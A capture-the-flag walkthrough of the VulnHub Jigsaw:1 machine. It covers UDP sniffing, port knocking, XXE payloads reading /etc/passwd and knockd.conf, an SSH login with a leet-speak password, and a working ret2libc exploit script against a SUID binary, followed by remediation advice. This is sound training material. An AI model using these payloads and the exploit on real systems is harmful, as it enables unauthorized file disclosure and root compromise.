# VulnHub Jigsaw:1 — I Want to Play a Game

Alright guys!! Buffer Overflow meets Port Knocking meets XXE in a single box, and yes, Zayotic absolutely nailed it with this one. ( ͡° ͜ʖ ͡°)

This is legitimately one of the most layered VulnHub machines you will find at the Hard tier: network sniffing, leet-speak password inference, port knocking, XXE injection reading internal files, and finally a ret2libc exploit against a SUID binary. Each layer is a puzzle piece, dude, and when they all click together it feels *bussin*. fr fr.

Thanks to **Zayotic** for building a machine that actually teaches you something real about binary exploitation while keeping the narrative fun with the Jigsaw theme.

---

| Field | Value |
|-------|-------|
| **Level** | Hard to Insane |
| **Target VM** | Jigsaw:1 |
| **Attacker VM** | Kali Linux 2019.2 |
| **VulnHub** | https://www.vulnhub.com/entry/jigsaw-1,228/ |
| **Techniques** | ARP/UDP sniffing, port knocking, XXE injection, SSH brute-force (leet), SUID binary BoF ret2libc |
| **CVEs** | CWE-611 (XXE), CWE-121 (Stack-based Buffer Overflow), CWE-787 (Out-of-bounds Write) |

> **Hints from the author:**
> "We recommend that you use VirtualBox over VMware for this VM."
> "Note, Check for ARP rather than port scans."

---

## Attack Summary

```
[host-discovery: arp-scan]
    |
    v
[network sniffing: tcpdump UDP port 666 -> leet-speak hint + flag1]
    |
    v
[port knocking: 5500 6600 7700 -> port 80 opens]
    |
    v
[HTTP enumeration: strings on GIF -> hidden login path]
    |
    v
[XXE injection on XML login form -> /etc/passwd + /etc/knockd.conf]
    |
    v
[port knocking: 7011 8011 9011 -> SSH port 22 opens]
    |
    v
[SSH login: jigsaw:j19s4w (leet-speak)]
    |
    v
[flag2 in ~/flag.txt]
    |
    v
[SUID binary /bin/game3 -> ELF 32-bit ret2libc BoF]
    |
    v
[ROOT shell]
    |
    v
[flag3 / final owned]
```

---

## Methodology

1. Host discovery on the local network segment
2. Network sniffing (the author's explicit hint: ARP is a misdirect, go deeper)
3. Decoding the UDP broadcast message: base64 decode of the secret
4. Port knocking to unlock port 80
5. Web enumeration and steganography on the GIF image
6. XXE injection on the XML-based login form
7. Second port knocking sequence to unlock SSH
8. SSH login using leet-speak credential
9. Binary exploitation: ret2libc against the SUID ELF32 binary

---

## Step 1 — Identifying the Target

The author is very clear: do not start with a standard port scan. The hint says "Check for ARP rather than port scans," which is a nudge to look at layer-2 traffic first. We use `arp-scan` to find the target on the local subnet, then keep sniffing.

```bash
# Identify the local gateway and subnet
route -n

# Find live hosts via ARP
arp-scan --ignoredups --localnet
# You can also use: nmap -sn -T5 192.168.0.0/24
# Or: netdiscover -r 192.168.0.0/24
```

Expected output:

```
192.168.0.6    08:00:27:xx:xx:xx    (VirtualBox)
```

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.001 Active Scanning: Scanning IP Blocks]

---

## Step 2 — Network Sniffing: Reading the Broadcast

> **What is network sniffing in this context?**
> The target VM is broadcasting messages on non-standard ports using UDP. Without sniffing the wire, you will never know the port exists. This is a real-world technique: C2 beacons, pivot hosts, and embedded devices often communicate on non-HTTP/S ports that standard TCP port scans miss.
> Reference: https://attack.mitre.org/techniques/T1040/

First attempt with ARP filter only gives you boilerplate ARP handshakes, nothing juicy. The trick is to *invert* the filter: capture everything from the host *except* ARP.

```bash
# First attempt: filter only ARP (gives nothing useful)
tcpdump -i eth1 -A -n host 192.168.0.6 and arp

# The real move: exclude ARP to catch the UDP broadcast
tcpdump -i eth1 -A -n host 192.168.0.6 and not arp
# -i eth1: select your network interface (use 'ip link' to confirm yours)
# -A: print in ASCII so embedded strings are readable
# -n: do not resolve DNS (faster, less noise)
# and not arp: skip ARP traffic and catch everything else
```

Expected output (after waiting a few seconds for the broadcast):

```
UDP port 666 traffic:
j19s4w was always fascinated with l33t speak, in fact he uses it for a lot of his passwords
```

There is also a base64-encoded message on that port. Connect with netcat UDP and send the trigger word:

```bash
# Trigger the secret message
python -c "print 'j19s4w'" | nc -u 192.168.0.6 666 -q1 | base64 -d
```

Expected output:

```
flag1{3034cc2927b59e0b20696241f14d573e}
You completed your first test.
Now knock these numbers to find what you seek. 5500 6600 7700
```

Noice!! ( ͡° ͜ʖ ͡°) flag1 captured and the next sequence is right there.

> **Real-world note:** Lateral movement and C2 beaconing over unusual UDP ports is a documented FIN7 technique. Their CARBANAK implant used custom UDP channels to avoid detection by signature-based IDS. Reference: https://attack.mitre.org/groups/G0046/

> **MITRE ATT&CK:** [T1040 Network Sniffing] [T1571 Non-Standard Port]

---

## Step 3 — Port Knocking: Unlocking the Web Service

> **What is port knocking?**
> Port knocking is a security mechanism where a firewall keeps a port closed until a specific sequence of connection attempts to other ports is made. It is legitimately used to hide SSH or admin services from automated scanners. Attackers who find the sequence can unlock the service silently.
> Reference: https://en.wikipedia.org/wiki/Port_knocking

We got the sequence from the UDP broadcast: `5500 6600 7700`. A simple nmap loop handles this cleanly.

```bash
# Knock the sequence to unlock port 80
for knock in 5500 6600 7700; do
    nmap -Pn --host-timeout 201 --max-retries 0 -p $knock 192.168.0.6
done

# You can also use the dedicated knockd client if installed
# knock 192.168.0.6 5500 6600 7700

# Now scan for newly opened ports
nmap -A -T4 -p- 192.168.0.6
```

Expected output after the knock:

```
80/tcp  open  http    Apache httpd 2.x
```

Port 80 is now live. ¯\_(ツ)_/¯ The firewall was hiding it the whole time.

> **MITRE ATT&CK:** [T1205.001 Traffic Signaling: Port Knocking] [T1046 Network Service Discovery]

---

## Step 4 — Web Enumeration and Steganography on the GIF

The web root shows only a Jigsaw character image. Good old `robots.txt` returns 404. Directory brute-force with common wordlists comes up empty too. That is a solid hint to look at the assets themselves rather than URL paths.

```bash
# Pull the GIF from the page source
wget http://192.168.0.6/jigsaw.gif

# Check file type
file jigsaw.gif

# Dump embedded strings (the quick steganography check)
strings jigsaw.gif
```

Expected output (last lines of strings):

```
/SeekAndYouShallFind
```

That path exists on the web server. Browsing to `http://192.168.0.6/SeekAndYouShallFind` reveals a login form that submits XML via POST. Bruh, the XML angle is already sus at this point.

The HTML source also has this gem:

```html
<!-- When you are in hell, only your mind can help you out. Test #2 will soon arrive. -->
```

> **Real-world note:** Hidden data in image files is a known exfiltration technique. APT41 (Winnti Group) has used steganography in PNG and GIF files to hide C2 configuration data. Reference: https://attack.mitre.org/groups/G0096/

> **MITRE ATT&CK:** [T1027.003 Obfuscated Files: Steganography] [T1083 File and Directory Discovery]

---

## Step 5 — XXE Injection: Reading the Server's Internals

> **What is XXE injection?**
> XML External Entity (XXE) injection occurs when an XML parser processes user-supplied input that references an external entity. An attacker can use this to read local files, perform SSRF, or in some configurations achieve remote code execution. It is OWASP A05:2021 (Security Misconfiguration) in context and CWE-611.
> Reference: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing

Intercept the login POST with Burp Suite (or use curl). The raw request body looks like:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
  <email>test@test.com</email>
  <password>testpass</password>
</root>
```

Classic XXE payload to read `/etc/passwd`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ELEMENT test ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
  <email>&xxe;</email>
  <password></password>
</root>
```

```bash
# Deliver the XXE payload via curl
curl -s -X POST http://192.168.0.6/SeekAndYouShallFind/login.php \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ELEMENT test ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><root><email>&xxe;</email><password></password></root>'
```

The response leaks `/etc/passwd`, confirming user `jigsaw` exists on the system. lowkey the best confirmation you can get. ԅ(≖‿≖ԅ)

Now read the knockd config to get the SSH unlock sequence:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ELEMENT test ANY > <!ENTITY xxe SYSTEM "file:///etc/knockd.conf" >]>
<root>
  <email>&xxe;</email>
  <password></password>
</root>
```

Expected leak from `/etc/knockd.conf`:

```
[openSSH]
    sequence    = 7011,8011,9011
    seq_timeout = 5
    command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
```

Bingo!! (☞ﾟヮﾟ)☞ Now we know the SSH knock sequence.

> **Real-world note:** XXE vulnerabilities have been used in serious breaches. The 2019 Facebook XXE bug (reported by bug bounty researcher) allowed reading internal AWS metadata. CVE-2019-0757 (NuGet) is in the CISA KEV. PayloadsAllTheThings covers 40+ XXE variants: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

> **MITRE ATT&CK:** [T1190 Exploit Public-Facing Application] [T1083 File and Directory Discovery]

---

## Step 6 — SSH Access via Leet-Speak Credential

Knock the SSH sequence first:

```bash
# Unlock port 22
knock 192.168.0.6 7011 8011 9011
# Or with nmap:
for knock in 7011 8011 9011; do
    nmap -Pn --host-timeout 201 --max-retries 0 -p $knock 192.168.0.6
done

# Confirm SSH is now open
nmap -A -T5 -p22 192.168.0.6
```

The UDP sniff message told us: `j19s4w was always fascinated with l33t speak, in fact he uses it for a lot of his passwords`. The username is `jigsaw`. In leet speak, `jigsaw` becomes `j19s4w`. That is the password. Based deduction.

```bash
ssh jigsaw@192.168.0.6
# Password: j19s4w
```

After login, you see:

```
=> There are 2 zombie processes
```

Interesting note, but the useful thing is in the home directory:

```bash
ls -la ~
cat ~/flag.txt
```

```
flag2{<flag_value>}
Hack or fail. Make your choice... Now comes your final test.
```

flag2 is ours. But the message is clear: the real challenge is still ahead. ლ(ಠ_ಠლ)

> **MITRE ATT&CK:** [T1021.004 Remote Services: SSH] [T1078 Valid Accounts]

---

## Step 7 — SUID Binary Discovery

```bash
# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Enumerate sudo permissions
sudo -l
```

Expected output from `find`:

```
/bin/game3
```

```bash
file /bin/game3
```

```
/bin/game3: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
dynamically linked (uses shared libs), for GNU/Linux 2.6.24,
BuildID[sha1]=affd50502e973bd3d6d0637028395d87ba695ab9, not stripped
```

Key facts: SUID set (runs as root), 32-bit, dynamically linked (libc is attackable), not stripped (symbols present for debugging). This is screaming ret2libc. ( ͡° ͜ʖ ͡°)

Test for buffer overflow manually:

```bash
/bin/game3 $(python -c "print 'A'*100")
# Segmentation fault
/bin/game3 $(python -c "print 'A'*50")
# Normal exit
```

Confirmed: there is an overflow somewhere between 50 and 100 bytes.

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.001 Setuid and Setgid]

---

## Step 8 — Buffer Overflow: Ret2Libc Exploit

> **What is a ret2libc attack?**
> Return-to-libc is a buffer overflow technique where instead of injecting shellcode, the attacker overwrites the saved return address on the stack to point to a function already loaded in memory, typically `system()` from libc. The argument `/bin/sh` is also sourced from libc's string table. This bypasses non-executable stack mitigations (NX/DEP) entirely.
> Reference: https://en.wikipedia.org/wiki/Return-to-libc_attack

Copy the binary to the attacker machine for debugging:

```bash
# From attacker machine
scp jigsaw@192.168.0.6:/bin/game3 /tmp/game3
```

Use `gdb-peda` to find the exact offset:

```bash
gdb /tmp/game3

# Generate a 200-char cyclic pattern
gdb-peda$ pattern_create 200

# Run with the pattern as argument
gdb-peda$ run <paste_pattern_here>

# Read EIP value from the crash
# EIP: 0x41344141 ('AA4A')

# Find the offset
gdb-peda$ pattern_offset AA4A
# Result: 76
```

The buffer size is 76 bytes. Now collect libc addresses from the *target* machine (not attacker, since ASLR values differ):

```bash
# On the target machine (jigsaw SSH session)
ldd /bin/game3 | grep libc
# libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb755f000)

readelf -s /lib/i386-linux-gnu/libc.so.6 | grep " system"
# Offset: 0x00040310

readelf -s /lib/i386-linux-gnu/libc.so.6 | grep " exit"
# Offset: 0x00033260

strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
# Offset: 0x00162d4c
```

Create the exploit script in `/tmp` on the target:

```python
# /tmp/xpl.py
from subprocess import call
import struct

base_addr  = 0xb755f000
sys_addr   = struct.pack("<I", base_addr + 0x00040310)
exit_addr  = struct.pack("<I", base_addr + 0x00033260)
shell_addr = struct.pack("<I", base_addr + 0x00162d4c)

buf  = "A" * 76
buf += sys_addr
buf += exit_addr
buf += shell_addr

i = 0
while i < 512:
    i += 1
    ret = call(["/bin/game3", buf])
```

```bash
# Run the exploit on the target
cd /tmp
python xpl.py
```

Wait a few seconds for the loop to hit the right stack alignment. When it fires:

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)
```

(╯°□°）╯︵ ┻━┻ WOW GUYS. Root achieved via ret2libc. Absolutely rekt.

> **Real-world note:** Ret2libc attacks are foundational to real-world exploit development. CVE-2021-4034 (PwnKit) uses a related technique on the `pkexec` SUID binary and is in the CISA KEV catalog. Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

> **MITRE ATT&CK:** [T1068 Exploitation for Privilege Escalation] [T1059.004 Unix Shell]

---

## Step 9 — Root and Flag

**(☞ﾟヮﾟ)☞ Got root!! :D**

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

ls /root
cat /root/flag.txt
# Or wherever the final flag lives
```

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|------|-------|----------|-------------|
| Flag 1 | `flag1{3034cc2927b59e0b20696241f14d573e}` | UDP port 666 broadcast (base64 decoded) | N/A |
| Flag 2 | `flag2{<value>}` | `~/flag.txt` after SSH login | N/A |
| Credential | `jigsaw:j19s4w` | Leet-speak inference from UDP sniff message | SSH login |
| SSH knock sequence 1 | `5500 6600 7700` | UDP port 666 decoded message | Unlocks port 80 |
| SSH knock sequence 2 | `7011 8011 9011` | XXE read of `/etc/knockd.conf` | Unlocks port 22 |
| BoF offset | `76 bytes` | gdb-peda pattern_offset | ret2libc payload |
| libc base | `0xb755f000` | `ldd /bin/game3` on target | ret2libc payload |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---------|---------------------|-------------|
| 1 | UDP broadcast leaking configuration hints | IoT devices and legacy systems often broadcast sensitive data over LAN | Always capture full network traffic during internal engagements, not just TCP |
| 2 | Port knocking as a hidden service mechanism | Some legacy servers and home routers still use knockd; knowing the sequence bypasses the protection entirely | Port knocking is obscurity, not security; proper firewall rules and VPN are needed |
| 3 | XXE injection on XML login forms | Many enterprise applications accept XML input (SOAP, REST with XML, SAP) without entity validation | Disable external entity processing in all XML parsers; use DENY ALL as default parser policy |
| 4 | Credentials derived from username in leet-speak | Password policies that permit predictable transformations are widely exploited | Enforce password complexity that prevents name-based passwords; use MFA |
| 5 | SUID binary with stack-based buffer overflow | Any SUID binary with a memory corruption bug gives an attacker a direct root escalation path | Audit all SUID binaries; remove SUID from binaries that do not require it |
| 6 | Ret2libc bypasses NX/DEP | Modern exploits use ROP chains built on the same principle; applicable to real production binaries | Enable ASLR system-wide, compile with stack canaries and PIE |

**Why does this matter outside the lab?**

The ret2libc technique in this machine is not academic. CVE-2021-4034 (PwnKit), affecting pkexec on virtually every Linux distribution, used an almost identical primitive: a SUID binary with a memory safety issue exploitable to escalate to root. It was present in polkit for over 12 years before discovery. The combination of port knocking hiding services and XXE leaking internal config files mirrors real APT tradecraft: FIN7 has been documented using covert channels and LFI/SSRF to map internal infrastructure before pivoting. The leet-speak password, while fun in CTF context, represents real weak password patterns that credential stuffing tools trivially cover with rule-based mutation (hashcat `--rule best64` generates leet variants by default).

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | Active Scanning: Scanning IP Blocks | T1595.001 |
| Reconnaissance | TA0043 | Network Sniffing | T1040 |
| Initial Access | TA0001 | Exploit Public-Facing Application (XXE) | T1190 |
| Initial Access | TA0001 | Valid Accounts (leet-speak credential) | T1078 |
| Execution | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Persistence | TA0003 | Web Shell (N/A here; binary exploit instead) | T1505.003 |
| Privilege Escalation | TA0004 | Exploitation for Privilege Escalation (ret2libc) | T1068 |
| Privilege Escalation | TA0004 | Setuid and Setgid | T1548.001 |
| Defense Evasion | TA0005 | Traffic Signaling: Port Knocking | T1205.001 |
| Credential Access | TA0006 | Unsecured Credentials (leet-speak in broadcast) | T1552.001 |
| Discovery | TA0007 | Network Service Discovery | T1046 |
| Discovery | TA0007 | File and Directory Discovery | T1083 |
| Discovery | TA0007 | System Information Discovery | T1082 |
| Collection | TA0009 | Data from Local System (flag files) | T1005 |

> ATT&CK Navigator: https://attack.mitre.org/
> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediation and Containment

### Technical Fixes

1. Disable external entity processing in all XML parsers; use `LIBXML_NOENT` off and validate input against a schema whitelist.
2. Remove the UDP broadcast service on port 666; if needed for internal comms, restrict to localhost and encrypt the payload.
3. Disable port knocking as a sole security mechanism; replace with a proper VPN (WireGuard, OpenVPN) with certificate-based auth.
4. Remove the SUID bit from `/bin/game3` and any custom binary that does not strictly require root; audit with `find / -perm -u=s`.
5. Compile all SUID binaries with modern hardening flags: `-fstack-protector-all`, `-D_FORTIFY_SOURCE=2`, and link with `-z relro -z now -pie`.
6. Enforce a password policy that rejects passwords derived from the username; implement MFA for all remote access.

### If You Find Something Similar in Your Environment

**Immediate containment:**
- Isolate the host from the network if XXE is confirmed; an attacker reading `/etc/passwd` may have already escalated to internal pivots.
- Rotate all SSH credentials on the affected host and audit SSH authorized_keys files.
- Review all SUID binaries on the host: `find / -perm -u=s -type f 2>/dev/null` and cross-reference against a known-good baseline.

**MITRE D3FEND countermeasures:**
- D3-IVA (Input Validation) for XXE (T1190)
- D3-MFA (Multi-factor Authentication) for weak credential abuse (T1078)
- D3-OPS (OS Process Sandboxing) for SUID binary exploitation (T1548.001)
- D3-CTS (Credential Transmission Scoping) for leet-speak broadcast (T1552.001)

### Framework Alignment

**NIST CSF 2.0:**
- Identify (ID.AM): Maintain inventory of all SUID binaries and exposed services.
- Protect (PR.AC-4): Implement privileged access management; remove unnecessary SUID bits.
- Detect (DE.CM-1): Monitor network traffic for unusual UDP broadcasts and non-standard port activity.
- Respond (RS.RP-1): Execute incident response plan upon detection of XXE exploitation.
- Recover (RC.RP-1): Restore from clean backup after credential rotation and hardening.

**NIST SP 800-53 (Rev. 5) Controls:**
- SI-10: Information Input Validation (XXE prevention)
- CM-7: Least Functionality (remove SUID, disable unnecessary services)
- IA-5: Authenticator Management (password policy, no leet-speak variants)
- AC-6: Least Privilege (SUID binary audit)
- SC-8: Transmission Confidentiality (encrypt UDP broadcast or remove it)

**CISA Known Exploited Vulnerabilities:**
- CVE-2021-4034 (pkexec SUID BoF, Polkit): same class as the game3 binary. Listed in CISA KEV.
- Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domain: TECHNOLOGY (Configuration Management)
- Practice: Manage configurations of technology assets to reduce attack surface
- Target MIL: MIL-2 (documented practices with defined processes)

---

## Final Thoughts

Thanks to **Zayotic** for building a machine that honestly feels like a structured course compressed into a single boot2root. The progression from UDP sniffing through port knocking through XXE to binary exploitation is genuinely educational, and the Jigsaw theme keeps the momentum going. This is not a "run Metasploit and get root" box: it rewards curiosity and lateral thinking at every stage.

For anyone working toward OSCP or eCPPT: this machine covers network enumeration, web application exploitation (XXE is on the exam), and binary exploitation fundamentals in a single go. The ret2libc technique here is a stepping stone toward understanding modern ROP chains used in real CVEs.

If this walkthrough helped you, share it with your crew and keep hacking!

*Thanks guys!! (❍ᴥ❍ʋ)*

> Original article in Portuguese by André Henrique: https://medium.com/@mrhenrike (VulnHub Jigsaw:1 Walkthrough)

---

*Writeup by [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
